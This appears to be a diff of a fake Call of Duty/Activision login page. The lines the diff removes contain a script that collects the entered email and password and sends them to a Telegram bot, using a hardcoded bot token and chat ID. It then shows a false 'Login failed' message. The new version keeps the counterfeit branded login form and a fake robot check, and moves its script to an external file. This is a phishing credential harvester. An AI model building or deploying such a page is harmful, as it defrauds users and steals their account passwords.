@@ -3,80 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Call of Duty - Login</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        'cod-yellow': '#FFDA0A',
-                        'cod-black': '#101010',
-                        'cod-gray': '#1E1E1E',
-                    },
-                    fontFamily: {
-                        'cod': ['Arial', 'Helvetica', 'sans-serif']
-                    }
-                }
-            },
-            darkMode: 'class',
-        };
-
-        function sendToTelegram(event) {
-            event.preventDefault();
-            const email = document.getElementById("email").value;
-            const password = document.getElementById("password").value;
-
-            if (!email || !password) {
-                alert("Please enter both email and password.");
-                return;
-            }
-
-            const botToken = "7732386670:AAGuV2q_N45I76ISD_8NYcnHPd2gyhk8sn0"; // Replace with your bot token
-            const chatId = "7182702425"; // Replace with your chat ID
-
-            const message = `🔹 New Login Attempt 🔹\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
-            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            fetch(telegramUrl, { method: "GET" })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        alert("Login failed. Please check your credentials.");
-                    } else {
-                        alert("An error occurred. Please try again.");
-                    }
-                })
-                .catch(error => console.error("Error sending data to Telegram:", error));
-        }
-    </script>
+    <title>Call of Duty Login</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
-<body class="grid-bg min-h-screen font-cod text-white">
-    <main class="container mx-auto px-4 py-8 max-w-lg">
-        <div class="flex flex-col items-center mb-8 py-6">
-            <div class="cod-font text-5xl sm:text-6xl text-center font-extrabold text-white tracking-tighter">
-                CALL<span class="text-3xl align-super">OF</span>DUTY
+<body>
+    <div class="login-container">
+        <h1 class="title"><span class="cod">CALL <span class="of">OF</span> DUTY</span></h1>
+        <h2 class="subtitle">LOGIN TO YOUR ACCOUNT</h2>
+        
+        <form id="login-form">
+            <label for="email">Email Address:<span>*</span></label>
+            <input type="email" id="email" placeholder="Enter your email address" required>
+            
+            <label for="password">Password:<span>*</span></label>
+            <input type="password" id="password" placeholder="Enter your password" required>
+            
+            <div class="options">
+                <label><input type="checkbox"> Remember me</label>
             </div>
-            <div class="text-xl uppercase tracking-wider mt-2">LOGIN TO YOUR ACCOUNT</div>
+            
+            <div class="recaptcha">
+                <input type="checkbox" id="robot-check">
+                <label for="robot-check">I'm not a robot</label>
+            </div>
+            
+            <button type="submit" class="login-btn">LOGIN NOW</button>
+        </form>
+
+        <div class="footer-links">
+            <p>Don't have an Activision Account? <a href="#">SIGN UP</a></p>
+            <p><a href="#">FORGOT YOUR PASSWORD?</a></p>
         </div>
-
-        <div class="bg-black bg-opacity-70 py-6 rounded mb-8">
-            <form onsubmit="sendToTelegram(event)">
-                <div class="mb-6 px-6">
-                    <label for="email" class="block mb-2 font-bold">Email Address:<span class="text-cod-yellow">*</span></label>
-                    <input type="email" id="email" class="w-full p-3 bg-white bg-opacity-10 border border-gray-700 focus:border-cod-yellow focus:outline-none text-base" placeholder="Enter your email">
-                </div>
-
-                <div class="mb-6 px-6">
-                    <label for="password" class="block mb-2 font-bold">Password:<span class="text-cod-yellow">*</span></label>
-                    <input type="password" id="password" class="w-full p-3 bg-white bg-opacity-10 border border-gray-700 focus:border-cod-yellow focus:outline-none text-base" placeholder="Enter your password">
-                </div>
-
-                <div class="px-6">
-                    <button type="submit" class="w-full py-4 bg-cod-yellow text-black text-xl font-bold uppercase tracking-wide yellow-glow transition">LOGIN NOW</button>
-                </div>
-            </form>
-        </div>
-    </main>
+    </div>
+    <script src="script.js"></script>
 </body>
 </html>
